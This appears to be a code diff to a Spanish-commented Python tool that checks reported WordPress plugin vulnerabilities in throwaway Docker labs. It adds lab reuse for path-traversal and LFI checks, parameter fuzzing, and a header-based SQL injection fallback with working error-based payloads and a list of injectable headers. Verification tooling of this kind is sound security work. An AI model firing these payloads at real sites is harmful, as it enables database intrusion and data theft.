@@ -148,6 +148,13 @@ _FILE_UPLOAD_HINTS = ("file", "upload", "avatar", "image", "attachment", "docume
 _UPLOAD_BINARY_SUFFIXES  = ("_url", "_content", "_data", "_binary", "_body", "_stream")
 _UPLOAD_NAME_SUFFIXES    = ("_name", "_filename", "_path")
 _SERIAL_HINTS = ("data", "payload", "value", "options", "settings", "meta", "object", "serialized")
+# HTTP headers commonly used as injection points (SQLi, SSTI, log-injection)
+_HEADER_INJECTION_HINTS = (
+    "X-Forwarded-For", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL",
+    "X-Custom-IP-Authorization", "X-Remote-IP", "X-Client-IP",
+    "User-Agent", "Referer", "Cookie",
+    "X-Api-Version", "X-Auth-Token", "Authorization",
+)
 
 
 @dataclass
@@ -3714,6 +3721,7 @@ def verify_wordpress_path_traversal(
     shortcode_name: Optional[str] = None,
     keep_lab_on_failure: bool = False,
     _tried_params_set: Optional[frozenset] = None,
+    _live_boot: Optional["_LabSession"] = None,
 ) -> WpVerifyResult:
     """Verifica path-traversal/LFI: planta un fichero CANARIO con un secreto aleatorio en una ruta
     del sistema de ficheros REAL del contenedor Apache (fuera del volumen /var/www/html, via
@@ -3749,13 +3757,17 @@ def verify_wordpress_path_traversal(
 
     lab = _Lab(_token())
     boot = None
+    _owns_boot = _live_boot is None
     try:
-        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
-                              companion_plugins=companion_plugins,
-                              extra_setup_trigger_paths=extra_setup_trigger_paths,
-                              shortcode_name=shortcode_name)
-        if boot is None:
-            return res
+        if _live_boot is not None:
+            boot = _live_boot
+        else:
+            boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                                  companion_plugins=companion_plugins,
+                                  extra_setup_trigger_paths=extra_setup_trigger_paths,
+                                  shortcode_name=shortcode_name)
+            if boot is None:
+                return res
 
         secret = secrets.token_hex(16)
         canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
@@ -4116,6 +4128,7 @@ def verify_wordpress_path_traversal(
                     shortcode_name=shortcode_name,
                     keep_lab_on_failure=False,
                     _tried_params_set=_already_tried_lfi,
+                    _live_boot=boot,  # reuse running lab — no extra Docker cost
                 )
                 if _lfi_rot.verified:
                     return _lfi_rot
@@ -4131,7 +4144,8 @@ def verify_wordpress_path_traversal(
         res.confidence = "not_reproducible"
         return res
     finally:
-        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+        if _owns_boot:
+            _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
 
 
 def verify_wordpress_lfi(
@@ -4141,6 +4155,8 @@ def verify_wordpress_lfi(
     companion_plugins: Optional[list] = None,
     shortcode_name: Optional[str] = None,
     keep_lab_on_failure: bool = False,
+    _tried_params_set: Optional[frozenset] = None,
+    _live_boot: Optional["_LabSession"] = None,
 ) -> WpVerifyResult:
     """Verifica Local File Inclusion (LFI) en plugins de WordPress.
 
@@ -4174,12 +4190,16 @@ def verify_wordpress_lfi(
 
     lab = _Lab(_token())
     boot = None
+    _owns_boot = _live_boot is None
     try:
-        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
-                              companion_plugins=companion_plugins,
-                              shortcode_name=shortcode_name)
-        if boot is None:
-            return res
+        if _live_boot is not None:
+            boot = _live_boot
+        else:
+            boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                                  companion_plugins=companion_plugins,
+                                  shortcode_name=shortcode_name)
+            if boot is None:
+                return res
 
         m = (http_method or "GET").upper()
         # Normalizar endpoint: extraer params del query string del propio endpoint
@@ -4490,17 +4510,50 @@ def verify_wordpress_lfi(
                 f"se probaron {len(read_tried)} payloads de lectura y {len(rce_tried)} "
                 f"rutas de log para LFI-a-RCE -- ninguno confirmo inclusion de fichero "
                 f"como codigo ni lectura de /etc/passwd o wp-config.php")
+            # LFI param fuzzing — reuse running lab (no extra Docker cost)
+            if (not res.verified and parameters
+                    and (_tried_params_set is None or len(_tried_params_set) < 4)):
+                _lfi2_already = (_tried_params_set or frozenset()) | {path_param}
+                _lfi2_names = (list(parameters.keys()) if isinstance(parameters, dict)
+                               else list(parameters))
+                _lfi2_cands = []
+                for _h in _PATH_HINTS:
+                    for _pn in _lfi2_names:
+                        if _h in _pn.lower() and _pn not in _lfi2_already and _pn not in _lfi2_cands:
+                            _lfi2_cands.append(_pn)
+                if _lfi2_cands:
+                    _lfi2_next = _lfi2_cands[0]
+                    _lfi2_budget = max(60.0, budget_s - (time.time() - t0))
+                    step(f"LFI-RCE param fuzzing: '{path_param}' sin inclusion; "
+                         f"probando siguiente candidato '{_lfi2_next}'...")
+                    _lfi2_rot = verify_wordpress_lfi(
+                        plugin_source_dir, slug, endpoint, http_method,
+                        parameters, path_param_hint=_lfi2_next,
+                        on_step=on_step, budget_s=_lfi2_budget,
+                        companion_plugins=companion_plugins,
+                        shortcode_name=shortcode_name,
+                        keep_lab_on_failure=False,
+                        _tried_params_set=_lfi2_already,
+                        _live_boot=boot,  # reuse running lab
+                    )
+                    if _lfi2_rot.verified:
+                        res.evidence["screenshots"] = boot.shots
+                        res.evidence["http_captures"] = boot.http_captures
+                        return _lfi2_rot
         res.evidence["screenshots"] = boot.shots
         res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
+        res.confidence = "not_reproducible"
         return res
     except Exception as e:
         res.detail = f"error inesperado: {e}"
+        res.confidence = "not_reproducible"
         return res
     finally:
-        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+        if _owns_boot:
+            _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
 
 
 def verify_wordpress_php_code_injection(
@@ -5145,6 +5198,7 @@ def verify_wordpress_sqli(
     sqli_via_request_uri: bool = False,
     sqli_via_rawurldecode: bool = False,
     _tried_params_set: Optional[frozenset] = None,
+    sqli_header_hint: str = "",
 ) -> WpVerifyResult:
     """Verifica SQL injection con CINCO tecnicas, de mas a menos dura, probando varios contextos
     de inyeccion (numerico sin comillas, comilla simple, comilla doble, cierre de parentesis) y
@@ -7126,6 +7180,62 @@ def verify_wordpress_sqli(
                 )
                 if _rot.verified:
                     return _rot
+        # --- Header injection fallback ---
+        # When no query/body param produced a SQLi signal, try injecting into HTTP headers
+        # (X-Forwarded-For, User-Agent, Referer…) — common pattern in log-based SQLi CVEs.
+        if not res.verified and boot is not None:
+            _hdr_candidates = []
+            if sqli_header_hint:
+                _hdr_candidates = [sqli_header_hint]
+            else:
+                # Only try headers if the LLM hypothesis mentions them or we exhausted params
+                _hyp_text = str(parameters) + str(endpoint)
+                for _hdr in _HEADER_INJECTION_HINTS:
+                    if _hdr.lower().replace("-", "_") in _hyp_text.lower():
+                        _hdr_candidates.append(_hdr)
+            for _inject_hdr in _hdr_candidates[:3]:
+                _hdr_budget = max(30.0, budget_s - (time.time() - t0))
+                if _hdr_budget < 30:
+                    break
+                step(f"header injection fallback: probando SQLi en header '{_inject_hdr}'...")
+                # Build a quick error-based probe via the header
+                _hdr_payloads = [
+                    "1' AND extractvalue(1,concat(0x7e,version()))-- -",
+                    "1 AND extractvalue(1,concat(0x7e,version()))-- -",
+                    "' OR '1'='1",
+                ]
+                _sess = boot.admin_sess if boot.admin_sess else boot.sub_sess
+                _base_p = dict(parameters) if isinstance(parameters, dict) else {}
+                for _hp in _hdr_payloads:
+                    try:
+                        _hr = _sess.request(
+                            (http_method or "GET").upper(), boot.base_url + endpoint,
+                            timeout=15,
+                            params=_base_p if (http_method or "GET").upper() == "GET" else None,
+                            data=_base_p if (http_method or "GET").upper() != "GET" else None,
+                            headers={_inject_hdr: _hp})
+                        _body = _hr.text or ""
+                        if any(sig in _body for sig in ("extractvalue", "XPATH syntax error",
+                                                         "mysql_num_rows", "SQL syntax",
+                                                         "You have an error in your SQL")):
+                            res.verified = True
+                            res.ok = True
+                            res.confidence = "confirmed"
+                            res.evidence.update({
+                                "tecnica": "error-based-header-injection",
+                                "header": _inject_hdr,
+                                "payload_ganador": _hp,
+                                "respuesta_cuerpo_recorte": _body[:500],
+                            })
+                            res.detail = (f"SQLi ERROR-BASED via CABECERA HTTP confirmada: "
+                                          f"header '{_inject_hdr}' = {_hp!r} produjo error SQL "
+                                          f"en la respuesta")
+                            step(f"VERIFICADO via header: '{_inject_hdr}' con payload {_hp!r}")
+                            break
+                    except Exception:
+                        pass
+                if res.verified:
+                    break
         return res
     except subprocess.TimeoutExpired as e:
         step(f"TIMEOUT en verify_wordpress_sqli: {e}")
